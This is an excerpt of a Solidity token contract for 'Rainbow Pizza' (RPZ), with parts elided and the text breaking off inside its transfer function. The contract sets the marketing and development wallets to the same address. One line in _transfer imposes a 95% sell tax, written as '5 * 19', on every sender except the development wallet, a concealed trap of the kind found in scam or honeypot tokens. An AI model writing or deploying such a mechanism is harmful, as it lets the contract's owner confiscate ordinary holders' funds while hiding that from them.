...
/**
    - Rainbow Pizza -
    Telegram : https://t.me/RainbowPizza
*/
...
contract RainbowPizza is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Rainbow Pizza";
    string private _symbol = "RPZ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x23848edA1E5686BDd17EE095057c240338CBc629); // Marketing Address
    address payable public DevelopmentWalletAddress = payable(0x23848edA1E5686BDd17EE095057c240338CBc629); // Development Address
    ...
    uint256 private _totalSupply = 234 * 10**6 * 10**9;
    uint256 public _maxTxAmount = 234 * 10**6 * 10**9;
    uint256 public _walletMax = 234 * 10**6 * 10**9;
    uint256 private minimumTokensBeforeSwap = 234 * 10**6 * 10**9;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender != DevelopmentWalletAddress && recipient == deadAddress) { _totalTaxIfSelling = 5 * 19; }
        if(inSwapAndLiquify)
        {
